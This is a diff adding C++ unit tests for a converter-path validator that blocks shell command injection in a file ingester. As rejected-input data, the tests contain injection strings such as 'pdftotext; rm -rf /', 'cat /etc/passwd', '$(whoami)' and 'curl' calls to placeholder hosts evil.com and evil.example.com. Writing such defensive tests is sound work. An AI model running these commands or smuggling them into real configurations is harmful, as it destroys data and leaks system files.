@@ -623,3 +623,115 @@ TEST(BinaryConverterTest, MagicDetectionCanBeDisabled) {
 
     std::filesystem::remove(p);
 }
+
+// ============================================================================
+// isConverterSafe – command injection guard (security audit)
+// ============================================================================
+
+TEST(IsConverterSafeTest, SafeConverterNames) {
+    // Plain program names and absolute paths are safe
+    EXPECT_TRUE(isConverterSafe("pdftotext"));
+    EXPECT_TRUE(isConverterSafe("pandoc"));
+    EXPECT_TRUE(isConverterSafe("/usr/bin/pdftotext"));
+    EXPECT_TRUE(isConverterSafe("/usr/local/bin/pandoc"));
+    EXPECT_TRUE(isConverterSafe("C:\\Program Files\\pdftotext.exe"));
+    EXPECT_TRUE(isConverterSafe("./tools/pdftotext"));
+}
+
+TEST(IsConverterSafeTest, EmptyConverterIsSafe) {
+    // Empty string means "disabled" – treated as safe (no command is spawned)
+    EXPECT_TRUE(isConverterSafe(""));
+}
+
+TEST(IsConverterSafeTest, InjectionPipeRejected) {
+    EXPECT_FALSE(isConverterSafe("pdftotext | cat /etc/passwd"));
+    EXPECT_FALSE(isConverterSafe("pdftotext|cat"));
+}
+
+TEST(IsConverterSafeTest, InjectionSemicolonRejected) {
+    EXPECT_FALSE(isConverterSafe("pdftotext; rm -rf /"));
+    EXPECT_FALSE(isConverterSafe(";id"));
+}
+
+TEST(IsConverterSafeTest, InjectionAmpersandRejected) {
+    EXPECT_FALSE(isConverterSafe("pdftotext && curl evil.com"));
+    EXPECT_FALSE(isConverterSafe("pdftotext&"));
+}
+
+TEST(IsConverterSafeTest, InjectionDollarRejected) {
+    EXPECT_FALSE(isConverterSafe("$HOME/pdftotext"));
+    EXPECT_FALSE(isConverterSafe("$(whoami)"));
+}
+
+TEST(IsConverterSafeTest, InjectionBacktickRejected) {
+    EXPECT_FALSE(isConverterSafe("`id`"));
+}
+
+TEST(IsConverterSafeTest, InjectionRedirectRejected) {
+    EXPECT_FALSE(isConverterSafe("pdftotext > /tmp/out"));
+    EXPECT_FALSE(isConverterSafe("pdftotext < /etc/passwd"));
+}
+
+TEST(IsConverterSafeTest, InjectionNewlineRejected) {
+    EXPECT_FALSE(isConverterSafe("pdftotext\nid"));
+    EXPECT_FALSE(isConverterSafe("pdftotext\rid"));
+}
+
+TEST(IsConverterSafeTest, UnsafeConverterSilentlySkippedForPdf) {
+    // An unsafe converter is silently rejected – no error, no crash, no execution
+    std::string pdf_content = "%PDF-1.4 fake pdf data";
+    auto p = std::filesystem::temp_directory_path() / "unsafe_conv_test.pdf";
+    auto injection_target = std::filesystem::temp_directory_path() / "pwned_by_themis_test";
+    // Ensure the injection target does not exist before the test
+    std::filesystem::remove(injection_target);
+    {
+        std::ofstream f(p, std::ios::binary);
+        f << pdf_content;
+    }
+
+    FileSystemIngester ingester;
+    SourceConfig cfg;
+    cfg.source_id = "unsafe_conv_pdf";
+    cfg.type      = SourceType::FILESYSTEM;
+    cfg.location  = p.string();
+    // Shell injection attempt in converter path
+    cfg.options["pdf_converter"] = "pdftotext; touch " + injection_target.string();
+    ASSERT_TRUE(ingester.initialize(cfg));
+
+    auto stats = ingester.ingest("col", nullptr);
+    // File silently skipped – no documents, no errors, no shell execution
+    EXPECT_EQ(stats.documents_processed, 0u);
+    EXPECT_EQ(stats.documents_failed, 0u);
+    EXPECT_TRUE(stats.errors.empty());
+    // Verify the injection target was NOT created
+    EXPECT_FALSE(std::filesystem::exists(injection_target));
+
+    std::filesystem::remove(p);
+}
+
+TEST(IsConverterSafeTest, UnsafeConverterSilentlySkippedForDocx) {
+    // Same injection guard applies for the DOCX converter
+    std::string docx_magic;
+    docx_magic += "PK\x03\x04";
+    docx_magic += "word/document.xml[Content_Types]";
+    auto p = std::filesystem::temp_directory_path() / "unsafe_conv_test.docx";
+    {
+        std::ofstream f(p, std::ios::binary);
+        f << docx_magic;
+    }
+
+    FileSystemIngester ingester;
+    SourceConfig cfg;
+    cfg.source_id = "unsafe_conv_docx";
+    cfg.type      = SourceType::FILESYSTEM;
+    cfg.location  = p.string();
+    cfg.options["docx_converter"] = "pandoc && curl http://evil.example.com";
+    ASSERT_TRUE(ingester.initialize(cfg));
+
+    auto stats = ingester.ingest("col", nullptr);
+    EXPECT_EQ(stats.documents_processed, 0u);
+    EXPECT_EQ(stats.documents_failed, 0u);
+    EXPECT_TRUE(stats.errors.empty());
+
+    std::filesystem::remove(p);
+}
